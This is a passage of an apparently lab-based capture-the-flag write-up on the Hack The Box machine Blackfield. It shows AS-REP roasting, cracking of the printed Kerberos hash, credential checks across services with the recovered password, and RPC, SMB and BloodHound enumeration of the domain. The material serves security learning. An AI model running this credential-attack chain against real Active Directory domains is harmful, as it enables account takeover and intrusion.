<p>TO perform AS-REP roasting, i will use <code>GetNPUsers.py</code><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>GetNPUsers.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.164.18<span class="w"> </span>BLACKFIELD.local/<span class="w"> </span>-usersfile<span class="w"> </span>usernames.txt<span class="w"> </span>&gt;<span class="w"> </span>as-rep-roast.txt
</span></code></pre></div></p>
<p>aand we got an asrep hash! and it appears to be associated with user <code>support</code><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nv">$krb5asrep$23$support</span>@BLACKFIELD.LOCAL:3bbe070692d760efc2224b563d1387b8<span class="nv">$8</span>bbe45bc2b5f1e80b063a9ceeb35754757f8851e1307c98d3bfcd05be9382d09ad731a9c6547414b5c15d3540903884aa7cb8aab778286593b5c76ab51ce572cbd9ea69d890c48123bb8cfbd3ceac109d9b46e1dc268625f0a7e08fd12f8f3dbc1117556b3326f259ea5d387c2d230728c00115d7fb525ee58b94dc8564dd511a95dfd327790ff1d44d2e215fd149d887033f5f5263a5c1759d8898ffd9093d5d498d44452bb6c7eef15587853e7941c3b2d1840727b2a09df7b04e8bbd35769537304ba20b08328f4dbb3f17f8b4d26fe910d4a4e4867fa482a9b7e3c130969df69a14092b40675b6a8c64be12f5afe4ecc7fca
</span></code></pre></div></p>
<p>lets crack it:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>john<span class="w"> </span>hash_blackfield_support.txt<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt
</span></code></pre></div><br />
the retrieved password is<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1">#00^BlackKnight</span>
</span></code></pre></div><br />
so the creds are<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>support
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="c1">#00^BlackKnight</span>
</span></code></pre></div></p>
<p>Lets now use my script to bulk check the services to which we can login with those creds:<br />
<a href="https://github.com/ch3ckkm8/auto_netexec">ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</a><br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span>blackfield.htb<span class="w"> </span><span class="s1">&#39;support&#39;</span><span class="w"> </span><span class="s1">&#39;#00^BlackKnight&#39;</span>
</span></code></pre></div></p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>winrm<span class="w"> </span>port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>winrm<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">5985</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>BLACKFIELD.local<span class="se">\\</span>support:#00^BlackKnight
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>BLACKFIELD.local<span class="se">\\</span>support:#00^BlackKnight<span class="w"> </span>
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">389</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>BLACKFIELD.local<span class="se">\\</span>support:#00^BlackKnight<span class="w"> </span>
</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>
</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>
</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">135</span><span class="w"> </span>open<span class="w"> </span><span class="w"> </span>checking<span class="w"> </span>wmi<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>RPC<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">135</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>RPC<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">135</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>BLACKFIELD.local<span class="se">\\</span>support:#00^BlackKnight<span class="w"> </span>
</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>
</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a>
</span><span id="__span-23-27"><a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-28"><a id="__codelineno-23-28" name="__codelineno-23-28" href="#__codelineno-23-28"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-23-29"><a id="__codelineno-23-29" name="__codelineno-23-29" href="#__codelineno-23-29"></a>
</span><span id="__span-23-30"><a id="__codelineno-23-30" name="__codelineno-23-30" href="#__codelineno-23-30"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-31"><a id="__codelineno-23-31" name="__codelineno-23-31" href="#__codelineno-23-31"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-23-32"><a id="__codelineno-23-32" name="__codelineno-23-32" href="#__codelineno-23-32"></a>
</span><span id="__span-23-33"><a id="__codelineno-23-33" name="__codelineno-23-33" href="#__codelineno-23-33"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-34"><a id="__codelineno-23-34" name="__codelineno-23-34" href="#__codelineno-23-34"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-23-35"><a id="__codelineno-23-35" name="__codelineno-23-35" href="#__codelineno-23-35"></a>
</span><span id="__span-23-36"><a id="__codelineno-23-36" name="__codelineno-23-36" href="#__codelineno-23-36"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>blackfield.htb...
</span><span id="__span-23-37"><a id="__codelineno-23-37" name="__codelineno-23-37" href="#__codelineno-23-37"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>mssql<span class="w"> </span><span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>closed
</span></code></pre></div><br />
interesting, according the the above output, with those creds, we can login to <code>RPC</code> , <code>SMB</code> and <code>LDAP</code>.<br />
So we should continue to enumerate again, using the obtained credentials this time.</p>
<h2 id="rpc-enumeration-as-user-support">RPC enumeration as user <code>support</code></h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;support%#00^BlackKnight&#39;</span><span class="w"> </span>blackfield.htb
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>enumdomains
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>name:<span class="o">[</span>BLACKFIELD<span class="o">]</span><span class="w"> </span>idx:<span class="o">[</span>0x0<span class="o">]</span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>name:<span class="o">[</span>Builtin<span class="o">]</span><span class="w"> </span>idx:<span class="o">[</span>0x0<span class="o">]</span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>enumdomusers
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>user:<span class="o">[</span>Administrator<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x1f4<span class="o">]</span>
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>user:<span class="o">[</span>Guest<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x1f5<span class="o">]</span>
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>user:<span class="o">[</span>krbtgt<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x1f6<span class="o">]</span>
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>user:<span class="o">[</span>audit2020<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x44f<span class="o">]</span>
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>user:<span class="o">[</span>support<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x450<span class="o">]</span>
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>user:<span class="o">[</span>BLACKFIELD764430<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x451<span class="o">]</span>
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>user:<span class="o">[</span>BLACKFIELD538365<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x452<span class="o">]</span>
</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>...
</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>user:<span class="o">[</span>BLACKFIELD438814<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x584<span class="o">]</span>
</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>user:<span class="o">[</span>svc_backup<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x585<span class="o">]</span>
</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a>user:<span class="o">[</span>lydericlefebvre<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x586<span class="o">]</span>
</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>
</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>rpcclient<span class="w"> </span>$&gt;<span class="w"> </span>enumdomgroups
</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>group:<span class="o">[</span>Enterprise<span class="w"> </span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x1f2<span class="o">]</span>
</span><span id="__span-25-20"><a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>group:<span class="o">[</span>Domain<span class="w"> </span>Admins<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x200<span class="o">]</span>
</span><span id="__span-25-21"><a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a>group:<span class="o">[</span>Domain<span class="w"> </span>Users<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x201<span class="o">]</span>
</span><span id="__span-25-22"><a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a>group:<span class="o">[</span>Domain<span class="w"> </span>Guests<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x202<span class="o">]</span>
</span><span id="__span-25-23"><a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a>group:<span class="o">[</span>Domain<span class="w"> </span>Computers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x203<span class="o">]</span>
</span><span id="__span-25-24"><a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a>group:<span class="o">[</span>Domain<span class="w"> </span>Controllers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x204<span class="o">]</span>
</span><span id="__span-25-25"><a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a>group:<span class="o">[</span>Schema<span class="w"> </span>Admins<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x206<span class="o">]</span>
</span><span id="__span-25-26"><a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a>group:<span class="o">[</span>Enterprise<span class="w"> </span>Admins<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x207<span class="o">]</span>
</span><span id="__span-25-27"><a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a>group:<span class="o">[</span>Group<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x208<span class="o">]</span>
</span><span id="__span-25-28"><a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a>group:<span class="o">[</span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x209<span class="o">]</span>
</span><span id="__span-25-29"><a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a>group:<span class="o">[</span>Cloneable<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x20a<span class="o">]</span>
</span><span id="__span-25-30"><a id="__codelineno-25-30" name="__codelineno-25-30" href="#__codelineno-25-30"></a>group:<span class="o">[</span>Protected<span class="w"> </span>Users<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x20d<span class="o">]</span>
</span><span id="__span-25-31"><a id="__codelineno-25-31" name="__codelineno-25-31" href="#__codelineno-25-31"></a>group:<span class="o">[</span>Key<span class="w"> </span>Admins<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x20e<span class="o">]</span>
</span><span id="__span-25-32"><a id="__codelineno-25-32" name="__codelineno-25-32" href="#__codelineno-25-32"></a>group:<span class="o">[</span>Enterprise<span class="w"> </span>Key<span class="w"> </span>Admins<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x20f<span class="o">]</span>
</span><span id="__span-25-33"><a id="__codelineno-25-33" name="__codelineno-25-33" href="#__codelineno-25-33"></a>group:<span class="o">[</span>DnsUpdateProxy<span class="o">]</span><span class="w"> </span>rid:<span class="o">[</span>0x44e<span class="o">]</span>
</span></code></pre></div><br />
okay, found some valuable info about users and groups, but for our convenience we will later proceed with LDAP enumeration by using bloodhound so we can get a better graphical representation.</p>
<h2 id="smb-enumeration-as-user-support">SMB enumeration as user <code>support</code></h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>blackfield.htb<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;support&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;#00^BlackKnight&#39;</span><span class="w"> </span>--shares
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="c1">#or</span>
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>smbmap<span class="w"> </span>-H<span class="w"> </span>blackfield.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;support&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;#00^BlackKnight&#39;</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>forensic<span class="w">                        </span>Forensic<span class="w"> </span>/<span class="w"> </span>Audit<span class="w"> </span>share.
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>NETLOGON<span class="w">        </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>profiles$<span class="w">       </span>READ<span class="w">            </span>
</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.164.18<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span></code></pre></div>
<p>hm with those creds we can <code>READ</code> 2 more shares that we could previously as Guest, those are <code>NETLOGON</code> and <code>SYSVOL</code>, but by inspecting those shares i found nothing useful!</p>
<h2 id="ldap-enumeration-as-user-support">LDAP enumeration as user <code>support</code></h2>
<h3 id="bloodhound-as-support">Bloodhound as support</h3>
<p>since we can login to <code>LDAP</code> this means we can use bloodhound<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;support&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;#00^BlackKnight&#39;</span><span class="w"> </span>-d<span class="w"> </span>BLACKFIELD.local<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.164.18<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
</span></code></pre></div></p>
<p>start bloodhound and inspect the user we currently have access first (support)</p>
<p><code>Group Membership</code> of user <code>support</code><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250809132333.png" /><br />
hm apart from being obviously member of the domain users group, no other group memberships observed</p>
<p><code>Outbound Object Control</code> of user <code>support</code><br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250809132344.png" /><br />
interesting, our owned user has <code>ForceChangePassword</code> rights towards <code>AUDIT2020</code> user.</p>
<p>We could now inspect this user to identify the full path that we will follow</p>
